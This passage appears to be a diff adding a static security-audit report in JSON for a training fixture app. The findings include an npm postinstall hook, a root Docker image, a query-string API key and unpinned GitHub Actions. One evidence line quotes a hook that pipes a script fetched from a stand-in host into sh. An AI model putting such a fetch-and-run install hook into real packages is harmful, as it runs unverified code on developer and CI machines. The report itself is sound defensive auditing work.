+      "id": "SA-CWE78-5a21e2ded7a5",
+      "history": [
+        {
+          "at": "2026-10-23T19:19:59.563392Z",
+          "event": "added",
+          "actor": "builtin-supplychain"
+        },
+        {
+          "at": "2026-10-23T19:19:59.564710Z",
+          "event": "merged",
+          "from": "builtin-supplychain"
+        }
+      ],
+      "claimed_confidence": "medium",
+      "risk_zone": "YELLOW",
+      "business_impact": {
+        "technical_severity": "medium",
+        "technical_priority": "P3",
+        "status": "assessed",
+        "asset_id": "build-and-ci",
+        "asset_criticality": "medium",
+        "asset_environment": "production",
+        "data_classes_at_risk": [
+          "secrets"
+        ],
+        "business_priority": "P4",
+        "business_severity": "low",
+        "program_expected_rating": null,
+        "context_source": "owner_provided",
+        "context_ref": "fixtures/vulnapp/README.md (training fixture; values are illustrative)",
+        "reviewed_by": null,
+        "notes": [
+          "not internet-exposed (-1)"
+        ],
+        "submission_recommendation": {
+          "decision": "needs_more_evidence",
+          "why": "not independently verified; do not submit as-is"
+        }
+      },
+      "financial_exposure": {
+        "method": "unknown",
+        "statement": "Financial exposure cannot be reliably quantified from the available evidence.",
+        "reason": "no estimate supplied",
+        "is_actual_loss": false,
+        "is_bounty_estimate": false
+      }
+    },
+    {
+      "title": "npm lifecycle script 'postinstall' runs on install and downloads remote code",
+      "category": "risky-lifecycle-script",
+      "cwe": "CWE-829",
+      "component": "package.json",
+      "target_id": "vulnapp",
+      "locations": [
+        {
+          "role": "location",
+          "file": "package.json",
+          "start_line": 7,
+          "end_line": 7
+        }
+      ],
+      "evidence": [
+        {
+          "kind": "config_excerpt",
+          "content": "    \"postinstall\": \"curl -s http://cdn.example.com/setup.sh | sh\"",
+          "file": "package.json",
+          "start_line": 7,
+          "end_line": 7,
+          "verified": true,
+          "verification_note": "matched lines 5-9"
+        }
+      ],
+      "description": "The 'postinstall' script executes automatically during `npm install`. It was NOT executed by the auditor.",
+      "preconditions": [
+        "Code path is reachable in the deployed configuration (not verified by the tool)."
+      ],
+      "attack_scenario": "Not established by the tool; requires analyst review of reachability and attacker control.",
+      "expected_boundary": "Installing dependencies should not execute unverified remote code.",
+      "observed_behavior": "scripts.postinstall = curl -s http://cdn.example.com/setup.sh | sh",
+      "technical_impact": "Code execution on every developer/CI machine that installs the package; remote fetches allow a third party to change what runs.",
+      "severity": "medium",
+      "severity_basis": "tool_default",
+      "cvss": null,
+      "confidence": "medium",
+      "verification": {
+        "status": "confirmed_static",
+        "basis": [
+          "tool:builtin-supplychain"
+        ]
+      },
+      "safe_validation": "Review the cited code and its callers statically; confirm attacker control of inputs using local tests against a disposable copy only. Do not test the live target.",
+      "remediation": "Remove install-time scripts or pin and verify downloaded artifacts by hash; use `npm ci --ignore-scripts` in CI where possible.",
+      "references": [
+        "https://docs.npmjs.com/cli/using-npm/scripts"
+      ],
+      "limitations": [
+        "Detected by pattern-based tool (builtin-supplychain); reachability and exploitability not established."
+      ],
+      "source": {
+        "kind": "tool",
+        "name": "builtin-supplychain",
+        "rule_id": "npm-lifecycle-postinstall"
+      },
+      "fingerprint": "faaa3349d116",
+      "id": "SA-CWE829-faaa3349d116",
+      "history": [
+        {
+          "at": "2026-10-23T19:19:59.560482Z",
+          "event": "added",
+          "actor": "builtin-supplychain"
+        }
+      ],
+      "claimed_confidence": "medium",
+      "risk_zone": "YELLOW",
+      "business_impact": {
+        "technical_severity": "medium",
+        "technical_priority": "P3",
+        "status": "assessed",
+        "asset_id": "build-and-ci",
+        "asset_criticality": "medium",
+        "asset_environment": "production",
+        "data_classes_at_risk": [
+          "secrets"
+        ],
+        "business_priority": "P4",
+        "business_severity": "low",
+        "program_expected_rating": null,
+        "context_source": "owner_provided",
+        "context_ref": "fixtures/vulnapp/README.md (training fixture; values are illustrative)",
+        "reviewed_by": null,
+        "notes": [
+          "not internet-exposed (-1)"
+        ],
+        "submission_recommendation": {
+          "decision": "low_value",
+          "why": "verified but low business priority; check the program accepts low-impact reports"
+        }
+      },
+      "financial_exposure": {
+        "method": "unknown",
+        "statement": "Financial exposure cannot be reliably quantified from the available evidence.",
+        "reason": "no estimate supplied",
+        "is_actual_loss": false,
+        "is_bounty_estimate": false
+      }
+    },
+    {
+      "title": "Container image runs as root (no non-root USER)",
+      "category": "container-hardening",
+      "cwe": "CWE-250",
+      "component": "Dockerfile",
+      "target_id": "vulnapp",
+      "locations": [
+        {
+          "role": "location",
+          "file": "Dockerfile",
+          "start_line": 1,
+          "end_line": 1
+        }
+      ],
+      "evidence": [
+        {
+          "kind": "config_excerpt",
+          "content": "FROM python:3.12-slim",
+          "file": "Dockerfile",
+          "start_line": 1,
+          "end_line": 1,
+          "verified": true,
+          "verification_note": "matched lines 1-3"
+        }
+      ],
+      "description": "No USER directive switching to a non-root account was found.",
+      "preconditions": [
+        "Code path is reachable in the deployed configuration (not verified by the tool)."
+      ],
+      "attack_scenario": "Not established by the tool; requires analyst review of reachability and attacker control.",
+      "expected_boundary": "Untrusted input should not reach this operation without validation/authorization.",
+      "observed_behavior": "Pattern matched by builtin-supplychain rule docker-root-user.",
+      "technical_impact": "Increases impact of any container escape or RCE.",
+      "severity": "low",
+      "severity_basis": "tool_default",
+      "cvss": null,
+      "confidence": "medium",
+      "verification": {
+        "status": "confirmed_static",
+        "basis": [
+          "tool:builtin-supplychain"
+        ]
+      },
+      "safe_validation": "Review the cited code and its callers statically; confirm attacker control of inputs using local tests against a disposable copy only. Do not test the live target.",
+      "remediation": "Add a dedicated non-root user and `USER` directive.",
+      "references": [],
+      "limitations": [
+        "Detected by pattern-based tool (builtin-supplychain); reachability and exploitability not established."
+      ],
+      "source": {
+        "kind": "tool",
+        "name": "builtin-supplychain",
+        "rule_id": "docker-root-user"
+      },
+      "fingerprint": "51fdf9d3461d",
+      "id": "SA-CWE250-51fdf9d3461d",
+      "history": [
+        {
+          "at": "2026-10-23T19:19:59.569357Z",
+          "event": "added",
+          "actor": "builtin-supplychain"
+        }
+      ],
+      "claimed_confidence": "medium",
+      "risk_zone": "YELLOW",
+      "business_impact": {
+        "technical_severity": "low",
+        "technical_priority": "P4",
+        "status": "assessed",
+        "asset_id": "build-and-ci",
+        "asset_criticality": "medium",
+        "asset_environment": "production",
+        "data_classes_at_risk": [
+          "secrets"
+        ],
+        "business_priority": "P4",
+        "business_severity": "low",
+        "program_expected_rating": null,
+        "context_source": "owner_provided",
+        "context_ref": "fixtures/vulnapp/README.md (training fixture; values are illustrative)",
+        "reviewed_by": null,
+        "notes": [
+          "not internet-exposed (-1)"
+        ],
+        "submission_recommendation": {
+          "decision": "low_value",
+          "why": "verified but low business priority; check the program accepts low-impact reports"
+        }
+      },
+      "financial_exposure": {
+        "method": "unknown",
+        "statement": "Financial exposure cannot be reliably quantified from the available evidence.",
+        "reason": "no estimate supplied",
+        "is_actual_loss": false,
+        "is_bounty_estimate": false
+      }
+    },
+    {
+      "title": "API key accepted in query string (legacyKey)",
+      "category": "credential-in-url",
+      "cwe": "CWE-598",
+      "component": "openapi.yaml",
+      "target_id": "vulnapp",
+      "locations": [
+        {
+          "role": "location",
+          "file": "openapi.yaml",
+          "start_line": 8,
+          "end_line": 8
+        }
+      ],
+      "evidence": [
+        {
+          "kind": "spec_excerpt",
+          "content": "    legacyKey: {type: apiKey, in: query, name: api_key}",
+          "file": "openapi.yaml",
+          "start_line": 8,
+          "end_line": 8,
+          "verified": true,
+          "verification_note": "matched lines 6-10"
+        }
+      ],
+      "description": "Query-string credentials leak into logs, proxies and browser history.",
+      "preconditions": [
+        "Code path is reachable in the deployed configuration (not verified by the tool)."
+      ],
+      "attack_scenario": "Not established by the tool; requires analyst review of reachability and attacker control.",
+      "expected_boundary": "Untrusted input should not reach this operation without validation/authorization.",
+      "observed_behavior": "Pattern matched by builtin-openapi rule oas-apikey-query.",
+      "technical_impact": "Credential exposure via logs/referrers.",
+      "severity": "low",
+      "severity_basis": "tool_default",
+      "cvss": null,
+      "confidence": "medium",
+      "verification": {
+        "status": "confirmed_static",
+        "basis": [
+          "tool:builtin-openapi"
+        ]
+      },
+      "safe_validation": "Review the cited code and its callers statically; confirm attacker control of inputs using local tests against a disposable copy only. Do not test the live target.",
+      "remediation": "Accept API keys in a header.",
+      "references": [],
+      "limitations": [
+        "Detected by pattern-based tool (builtin-openapi); reachability and exploitability not established."
+      ],
+      "source": {
+        "kind": "tool",
+        "name": "builtin-openapi",
+        "rule_id": "oas-apikey-query"
+      },
+      "fingerprint": "085a8c3b3eb4",
+      "id": "SA-CWE598-085a8c3b3eb4",
+      "history": [
+        {
+          "at": "2026-10-23T19:19:59.574935Z",
+          "event": "added",
+          "actor": "builtin-openapi"
+        }
+      ],
+      "claimed_confidence": "medium",
+      "risk_zone": "YELLOW",
+      "business_impact": {
+        "technical_severity": "low",
+        "technical_priority": "P4",
+        "status": "assessed",
+        "asset_id": "shop-api",
+        "asset_criticality": "critical",
+        "asset_environment": "production",
+        "data_classes_at_risk": [
+          "pii",
+          "payment",
+          "credentials",
+          "authentication"
+        ],
+        "business_priority": "P4",
+        "business_severity": "low",
+        "program_expected_rating": null,
+        "context_source": "owner_provided",
+        "context_ref": "fixtures/vulnapp/README.md (training fixture; values are illustrative)",
+        "reviewed_by": null,
+        "notes": [],
+        "submission_recommendation": {
+          "decision": "low_value",
+          "why": "verified but low business priority; check the program accepts low-impact reports"
+        }
+      },
+      "financial_exposure": {
+        "method": "unknown",
+        "statement": "Financial exposure cannot be reliably quantified from the available evidence.",
+        "reason": "no estimate supplied",
+        "is_actual_loss": false,
+        "is_bounty_estimate": false
+      }
+    },
+    {
+      "title": "GitHub Action not pinned to a commit SHA: actions/checkout@v4",
+      "category": "unpinned-ci-dependency",
+      "cwe": "CWE-829",
+      "component": ".github",
+      "target_id": "vulnapp",
+      "locations": [
+        {
+          "role": "location",
+          "file": ".github/workflows/ci.yml",
+          "start_line": 9,
+          "end_line": 9
+        }
+      ],
+      "evidence": [
+        {
+          "kind": "config_excerpt",
+          "content": "- uses: actions/checkout@v4",
+          "file": ".github/workflows/ci.yml",
+          "start_line": 9,
+          "end_line": 9,
+          "verified": true,
+          "verification_note": "matched lines 7-11"
+        }
+      ],
+      "description": "Mutable tags can be force-pushed by whoever controls the action repository (as happened to aquasecurity/trivy-action in March 2026, CVE-2026-33634).",
+      "preconditions": [
+        "Code path is reachable in the deployed configuration (not verified by the tool)."
+      ],
+      "attack_scenario": "Not established by the tool; requires analyst review of reachability and attacker control.",
+      "expected_boundary": "Untrusted input should not reach this operation without validation/authorization.",
+      "observed_behavior": "Pattern matched by builtin-supplychain rule gha-unpinned-action.",
+      "technical_impact": "CI secrets exposure if the referenced action is compromised.",
+      "severity": "low",
+      "severity_basis": "tool_default",
+      "cvss": null,
+      "confidence": "medium",
+      "verification": {
+        "status": "confirmed_static",
+        "basis": [
+          "tool:builtin-supplychain"
+        ]
+      },
+      "safe_validation": "Review the cited code and its callers statically; confirm attacker control of inputs using local tests against a disposable copy only. Do not test the live target.",
+      "remediation": "Pin third-party actions to a full commit SHA and update via a reviewed process.",
+      "references": [
+        "https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-33634"
+      ],
+      "limitations": [
+        "Detected by pattern-based tool (builtin-supplychain); reachability and exploitability not established."
+      ],
+      "source": {
+        "kind": "tool",
+        "name": "builtin-supplychain",
+        "rule_id": "gha-unpinned-action"
+      },
+      "fingerprint": "58ccb551a969",
+      "id": "SA-CWE829-58ccb551a969",
+      "history": [
+        {
+          "at": "2026-10-23T19:19:59.562098Z",
+          "event": "added",
+          "actor": "builtin-supplychain"
+        }
+      ],
+      "claimed_confidence": "medium",
+      "risk_zone": "YELLOW",
+      "business_impact": {
+        "technical_severity": "low",
+        "technical_priority": "P4",
+        "status": "assessed",
+        "asset_id": "build-and-ci",
+        "asset_criticality": "medium",
+        "asset_environment": "production",
+        "data_classes_at_risk": [
+          "secrets"
+        ],
+        "business_priority": "P4",
+        "business_severity": "low",
+        "program_expected_rating": null,
+        "context_source": "owner_provided",
+        "context_ref": "fixtures/vulnapp/README.md (training fixture; values are illustrative)",
+        "reviewed_by": null,
+        "notes": [
+          "not internet-exposed (-1)"
+        ],
+        "submission_recommendation": {
+          "decision": "low_value",
+          "why": "verified but low business priority; check the program accepts low-impact reports"
+        }
+      },
+      "financial_exposure": {
+        "method": "unknown",
+        "statement": "Financial exposure cannot be reliably quantified from the available evidence.",
+        "reason": "no estimate supplied",
+        "is_actual_loss": false,
+        "is_bounty_estimate": false
+      }
+    },
+    {
+      "title": "GitHub Action not pinned to a commit SHA: actions/setup-python@v5",
+      "category": "unpinned-ci-dependency",
+      "cwe": "CWE-829",
+      "component": ".github",
+      "target_id": "vulnapp",
+      "locations": [
+        {
+          "role": "location",
+          "file": ".github/workflows/ci.yml",
+          "start_line": 14,
+          "end_line": 14
+        }
+      ],
+      "evidence": [
+        {
+          "kind": "config_excerpt",
+          "content": "- uses: actions/setup-python@v5",
+          "file": ".github/workflows/ci.yml",
+          "start_line": 14,
+          "end_line": 14,
+          "verified": true,
+          "verification_note": "matched lines 12-15"
+        }
+      ],
+      "description": "Mutable tags can be force-pushed by whoever controls the action repository (as happened to aquasecurity/trivy-action in March 2026, CVE-2026-33634).",
+      "preconditions": [
+        "Code path is reachable in the deployed configuration (not verified by the tool)."
+      ],
+      "attack_scenario": "Not established by the tool; requires analyst review of reachability and attacker control.",
+      "expected_boundary": "Untrusted input should not reach this operation without validation/authorization.",
+      "observed_behavior": "Pattern matched by builtin-supplychain rule gha-unpinned-action.",
+      "technical_impact": "CI secrets exposure if the referenced action is compromised.",
+      "severity": "low",
+      "severity_basis": "tool_default",
+      "cvss": null,
+      "confidence": "medium",
+      "verification": {
+        "status": "confirmed_static",
+        "basis": [
+          "tool:builtin-supplychain"
+        ]
+      },
+      "safe_validation": "Review the cited code and its callers statically; confirm attacker control of inputs using local tests against a disposable copy only. Do not test the live target.",
+      "remediation": "Pin third-party actions to a full commit SHA and update via a reviewed process.",
+      "references": [
+        "https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-33634"
+      ],
+      "limitations": [
+        "Detected by pattern-based tool (builtin-supplychain); reachability and exploitability not established."
+      ],
+      "source": {
+        "kind": "tool",
+        "name": "builtin-supplychain",
+        "rule_id": "gha-unpinned-action"
+      },
+      "fingerprint": "7ddef4668ed8",
+      "id": "SA-CWE829-7ddef4668ed8",
+      "history": [
+        {
+          "at": "2026-10-23T19:19:59.565865Z",
+          "event": "added",
+          "actor": "builtin-supplychain"
+        }
+      ],
+      "claimed_confidence": "medium",
+      "risk_zone": "YELLOW",
+      "business_impact": {
+        "technical_severity": "low",
+        "technical_priority": "P4",
+        "status": "assessed",
+        "asset_id": "build-and-ci",
+        "asset_criticality": "medium",
+        "asset_environment": "production",
+        "data_classes_at_risk": [
+          "secrets"
+        ],
+        "business_priority": "P4",
+        "business_severity": "low",
+        "program_expected_rating": null,
+        "context_source": "owner_provided",
+        "context_ref": "fixtures/vulnapp/README.md (training fixture; values are illustrative)",
+        "reviewed_by": null,
+        "notes": [
+          "not internet-exposed (-1)"
+        ],
+        "submission_recommendation": {
+          "decision": "low_value",
+          "why": "verified but low business priority; check the program accepts low-impact reports"
+        }
+      },
+      "financial_exposure": {
+        "method": "unknown",
+        "statement": "Financial exposure cannot be reliably quantified from the available evidence.",
+        "reason": "no estimate supplied",
+        "is_actual_loss": false,
+        "is_bounty_estimate": false
+      }
+    }
+  ],
+  "excluded_findings": [
+    {
+      "id": "SA-CWE259-177d4ec98692",
+      "title": "hardcoded password string: Possible hardcoded password: 'pass…[REDACTED]'",
+      "status": "false_positive",
+      "rationale": "tests/test_login.py value is an explicit test-only dummy used by a placeholder assertion; not a deployed credential."
+    },
+    {
+      "id": "SA-CWE798-752d6622c612",
+      "title": "Admin password hardcoded in auth module (invented excerpt)",
+      "status": "false_positive",
+      "rationale": "Cited excerpt does not exist in app/auth.py; evidence failed snapshot verification (hallucinated candidate)."
+    }
+  ],
+  "rejected_candidates": [
+    {
+      "actor": "sentinel-static-code",
+      "id": "SA-CWE798-849fff160c8e",
+      "title": "Secret in settings module (invented file)",
+      "reasons": [
+        "location file not found in snapshot: app/settings_prod.py"
+      ],
+      "at": "2026-10-23T19:20:00.114965Z"
+    }
+  ],
+  "coverage": {
+    "tools": {
+      "semgrep": {
+        "tool": "semgrep",
+        "available": true,
+        "returncode": 0,
+        "seconds": 13.73,
+        "rulesets": [
+          "<repo>/rules/semgrep"
+        ],
+        "error": null
+      },
+      "bandit": {
+        "tool": "bandit",
+        "available": true,
+        "returncode": 1,
+        "seconds": 1.21,
+        "error": null
+      },
+      "gitleaks": {
+        "tool": "gitleaks",
+        "available": true,
+        "returncode": 0,
+        "seconds": 0.43,
+        "error": null
+      },
+      "osv-scanner": {
+        "tool": "osv-scanner",
+        "available": true,
+        "returncode": 1,
+        "seconds": 2.95,
+        "offline": false,
+        "error": null
+      },
+      "builtin-supplychain": {
+        "tool": "builtin-supplychain",
+        "available": true,
+        "files_checked": [
+          "package.json",
+          ".github/workflows/ci.yml",
+          "Dockerfile"
+        ]
+      },
+      "builtin-openapi": {
+        "tool": "builtin-openapi",
+        "available": true,
+        "spec": "openapi.yaml"
+      }
+    },
+    "targets": {
+      "vulnapp": {
+        "analyzed": true,
+        "analyzers": [
+          "semgrep",
+          "bandit",
+          "gitleaks",
+          "osv-scanner",
+          "builtin-supplychain",
+          "builtin-openapi"
+        ]
+      }
+    }
+  },
+  "inventory_summary": {
+    "languages": {
+      "python": 4,
+      "solidity": 1,
+      "javascript": 1
+    },
+    "frameworks": [
+      "flask"
+    ],
+    "manifests": [
+      "package-lock.json",
+      "package.json",
+      "requirements.txt"
+    ],
+    "api_specs": [
+      "openapi.yaml"
+    ]
+  },
+  "limitations": [
+    "Static and passive analysis only; no dynamic testing or exploitation was performed.",
+    "Reachability of vulnerable dependencies was not established unless stated per finding.",
+    "LLM-assisted findings were only accepted when their evidence matched the immutable snapshot.",
+    "Run was offline: no live web/API observations were made."
+  ],
+  "bug_bounty": null
+}
